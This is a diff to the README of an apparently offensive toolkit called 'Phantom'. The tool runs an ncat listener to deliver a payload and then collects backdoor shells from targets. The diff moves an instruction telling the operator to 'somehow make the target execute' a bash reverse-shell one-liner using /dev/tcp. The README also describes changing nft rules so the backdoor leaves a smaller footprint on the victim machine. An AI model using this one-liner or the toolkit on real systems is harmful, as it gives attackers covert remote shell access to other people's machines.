@@ -20,6 +20,10 @@ phantom-init	ip 1st-port 2nd-port
 *	1st-port: the port that listens for connections to deliver the payload
 *	2nd-port: the port that listens for the backdoor shells after delivering the payload
 
+You have to somehow make the target execute this code, so that he connects to the 1st-port:  
+bash -c 'bash &>/dev/tcp/ip/1st-port 0>&1 &'  
+ip and 1st-port are the ones specified above.
+
 ## Files
 
 *	phantom-init: Opens an ncat listening process to a predefined ip and port and redirects input to the payload file.
@@ -39,10 +43,6 @@ phantom-init	ip 1st-port 2nd-port
 modifies the nft ruleset so that it doesn't allow more than one connection from a target ip. This is good because the target machine will
 continuously open new bash shells, increasing the footprint of Phantom's actions and putting increasing and uneeded load on the target system.
 It can also undo changes made to the nft ruleset by using the argument -r | -R .
-
-You have to somehow make the target execute this code, so that he connects to the 1st-port:  
-bash -c 'bash &>/dev/tcp/ip/1st-port 0>&1 &'  
-ip and 1st-port are the ones specified above.
 
 ## Order of execution
 
